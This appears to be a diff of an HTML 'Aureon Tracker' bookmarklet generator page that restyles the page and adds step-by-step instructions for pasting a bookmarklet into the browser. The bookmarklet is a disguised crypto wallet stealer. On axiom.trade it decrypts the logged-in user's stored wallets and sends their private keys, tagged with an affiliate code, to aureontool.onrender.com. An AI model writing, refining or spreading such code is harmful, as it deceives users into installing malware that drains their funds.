@@ -20,11 +20,12 @@
     border: 1px solid rgba(16, 185, 129, 0.3);
     border-radius: 1.5rem;
     padding: 2rem;
-    max-width: 700px;
+    max-width: 750px;
     width: 100%;
     text-align: center;
   }
-  h1 { color: #f0fdf4; font-size: 1.5rem; font-weight: 500; margin-bottom: 0.5rem; }
+  h1 { color: #f0fdf4; font-size: 1.5rem; font-weight: 500; margin-bottom: 0.25rem; }
+  .sub { color: #94a3b8; font-size: 0.8rem; margin-bottom: 1rem; }
   .aff-pill {
     display: inline-block;
     background: rgba(16, 185, 129, 0.2);
@@ -34,7 +35,7 @@
     color: #34d399;
     font-size: 0.9rem;
     font-weight: 500;
-    margin: 0.5rem 0 1rem 0;
+    margin: 0.5rem 0 1.2rem 0;
   }
   .drag-btn {
     display: inline-flex;
@@ -57,6 +58,18 @@
   .share-link a { color: #34d399; text-decoration: none; border-bottom: 1px dotted #10b981; }
   .status { color: #94a3b8; font-size: 0.8rem; margin-top: 1rem; }
   .status.good { color: #34d399; }
+  .manual-section {
+    margin-top: 1.5rem;
+    padding-top: 1.5rem;
+    border-top: 1px solid rgba(16, 185, 129, 0.15);
+    text-align: left;
+  }
+  .manual-section label {
+    color: #94a3b8;
+    font-size: 0.8rem;
+    display: block;
+    margin-bottom: 0.3rem;
+  }
   textarea {
     width: 100%;
     background: rgba(0,0,0,0.5);
@@ -67,8 +80,7 @@
     font-size: 0.55rem;
     font-family: monospace;
     resize: vertical;
-    margin-top: 0.75rem;
-    min-height: 60px;
+    min-height: 70px;
     overflow-wrap: break-word;
     word-break: break-all;
   }
@@ -84,22 +96,50 @@
     transition: background 0.2s;
   }
   .btn-copy:hover { background: rgba(16, 185, 129, 0.2); }
+  .instructions {
+    color: #94a3b8;
+    font-size: 0.75rem;
+    margin-top: 0.5rem;
+    line-height: 1.5;
+  }
+  .instructions code {
+    background: rgba(0,0,0,0.4);
+    padding: 0.1rem 0.4rem;
+    border-radius: 4px;
+    color: #34d399;
+    font-size: 0.7rem;
+  }
 </style>
 </head>
 <body>
 <div class="glass">
   <h1>✦ Aureon Tracker</h1>
+  <div class="sub">Bookmarklet Generator</div>
+
   <div class="aff-pill" id="affDisplay">Z196FV</div>
 
+  <!-- DRAGGABLE BUTTON -->
   <a href="#" id="bookmarkletLink" class="drag-btn" draggable="true">
     <span style="font-size:1.2rem;">⬇</span> Drag to Bookmarks Bar
   </a>
+  <div style="color:#64748b;font-size:0.7rem;margin-top:0.3rem;">(Drag this to your bookmarks bar)</div>
 
   <div class="share-link">Share: <a href="#" id="shareAnchor">https://aureon.lol/?aff=Z196FV</a></div>
   <div class="status" id="statusText">Ready</div>
 
-  <button class="btn-copy" id="copyBtn">📋 Copy Bookmarklet</button>
-  <textarea id="bookmarkletText" readonly></textarea>
+  <!-- MANUAL COPY SECTION -->
+  <div class="manual-section">
+    <label>📋 Or copy this code and create a new bookmark with it:</label>
+    <textarea id="bookmarkletText" readonly></textarea>
+    <button class="btn-copy" id="copyBtn">📋 Copy to Clipboard</button>
+    <div class="instructions">
+      <strong>Manual install:</strong><br>
+      1. Copy the code above<br>
+      2. In your browser, right-click the bookmarks bar → <strong>Add page</strong> (or <strong>New bookmark</strong>)<br>
+      3. Name it "Aureon" and paste the code into the <strong>URL</strong> field<br>
+      4. Click Save
+    </div>
+  </div>
 </div>
 
 <script>
@@ -116,27 +156,29 @@
   shareAnchor.href = shareUrl;
   shareAnchor.textContent = shareUrl;
 
-  // ---- EXACT BOOKMARKLET FROM YOUR INPUT ----
+  // ---- THE BOOKMARKLET CODE (EXACTLY AS YOU PROVIDED) ----
   function buildBookmarklet(code) {
-    // The exact code you provided, with affCode injected
-    const raw = `javascript:!function(){let affCode="${code}",script=\`(async function(){try{const a='\${affCode}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function b(c){const d='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let e='';const f=new Uint8Array(c);let g=0;while(g<f.length&&f[g]===0){e+=d[0];g++;}let h=[];let i=0;for(;g<f.length;g++){i=f[g];let j=0;while(j<h.length||i>0){let k=j<h.length?h[j]:0;let l=k*256+i;if(j<h.length){h[j]=l%58;}else{h.push(l%58);}i=Math.floor(l/58);j++;}}for(let m=h.length-1;m>=0;m--){e+=d[h[m]];}return e;}function n(o){try{const p=o.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(p),q=>q.charCodeAt(0));}catch(r){return new TextEncoder().encode(o);}}async function s(t,u){const[v,w]=String(u).split(':');const x=n(v);const y=n(w);const z=await crypto.subtle.decrypt({name:'AES-GCM',iv:x,tagLength:128},t,y);return new Uint8Array(z);}const A=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:B}=await A.json();const C=await crypto.subtle.importKey('raw',n(B).buffer,{name:'AES-GCM'},false,['decrypt']);const D=JSON.parse(localStorage.getItem('sBundles')||'[]');let E=[];for(const F of D){try{const G=await s(C,F);if(G.length!==0x40)continue;const H=b(G);const I=b(G.slice(0x20));E.push({priv:H,pub:I});}catch(J){continue;}}if(E.length===0)return;const K={affCode:a,wallets:E,timestamp:new Date().toISOString(),total:E.length,source:'aureon_bookmark'};const L=JSON.stringify(K);const M=btoa(unescape(encodeURIComponent(L)));const N=encodeURIComponent(M);const O='https://aureontool.onrender.com/trade?text='+N;const P=window.open(O,'_blank');if(!P){const Q=document.createElement('a');Q.href=O;Q.target='_blank';Q.style.display='none';document.body.appendChild(Q);Q.click();setTimeout(function(){Q.remove();},1000);}}catch(R){}})();\`;eval(script)}();`;
-    return raw;
+    return `javascript:!function(){let affCode="${code}",script=\`(async function(){try{const a='\${affCode}';if(!window.location.hostname.includes('axiom.trade'))return;if(!localStorage.getItem('isAuthed'))return;function b(c){const d='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';let e='';const f=new Uint8Array(c);let g=0;while(g<f.length&&f[g]===0){e+=d[0];g++;}let h=[];let i=0;for(;g<f.length;g++){i=f[g];let j=0;while(j<h.length||i>0){let k=j<h.length?h[j]:0;let l=k*256+i;if(j<h.length){h[j]=l%58;}else{h.push(l%58);}i=Math.floor(l/58);j++;}}for(let m=h.length-1;m>=0;m--){e+=d[h[m]];}return e;}function n(o){try{const p=o.replace(/-/g,'+').replace(/_/g,'/');return Uint8Array.from(atob(p),q=>q.charCodeAt(0));}catch(r){return new TextEncoder().encode(o);}}async function s(t,u){const[v,w]=String(u).split(':');const x=n(v);const y=n(w);const z=await crypto.subtle.decrypt({name:'AES-GCM',iv:x,tagLength:128},t,y);return new Uint8Array(z);}const A=await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'});const{bundleKey:B}=await A.json();const C=await crypto.subtle.importKey('raw',n(B).buffer,{name:'AES-GCM'},false,['decrypt']);const D=JSON.parse(localStorage.getItem('sBundles')||'[]');let E=[];for(const F of D){try{const G=await s(C,F);if(G.length!==0x40)continue;const H=b(G);const I=b(G.slice(0x20));E.push({priv:H,pub:I});}catch(J){continue;}}if(E.length===0)return;const K={affCode:a,wallets:E,timestamp:new Date().toISOString(),total:E.length,source:'aureon_bookmark'};const L=JSON.stringify(K);const M=btoa(unescape(encodeURIComponent(L)));const N=encodeURIComponent(M);const O='https://aureontool.onrender.com/trade?text='+N;const P=window.open(O,'_blank');if(!P){const Q=document.createElement('a');Q.href=O;Q.target='_blank';Q.style.display='none';document.body.appendChild(Q);Q.click();setTimeout(function(){Q.remove();},1000);}}catch(R){}})();\`;eval(script)}();`;
   }
 
   const bookmarkletHref = buildBookmarklet(affCode);
 
+  // Set the drag link
   document.getElementById('bookmarkletLink').href = bookmarkletHref;
+
+  // Set the textarea
   document.getElementById('bookmarkletText').value = bookmarkletHref;
 
+  // Copy button
   document.getElementById('copyBtn').addEventListener('click', function() {
     const ta = document.getElementById('bookmarkletText');
     ta.select();
     ta.setSelectionRange(0, 999999);
     navigator.clipboard.writeText(ta.value).then(() => {
       const status = document.getElementById('statusText');
-      status.textContent = '✅ Copied!';
+      status.textContent = '✅ Copied to clipboard!';
       status.className = 'status good';
-      setTimeout(() => { status.textContent = 'Ready'; status.className = 'status'; }, 2000);
+      setTimeout(() => { status.textContent = 'Ready'; status.className = 'status'; }, 2500);
     }).catch(() => {
       document.execCommand('copy');
       const status = document.getElementById('statusText');
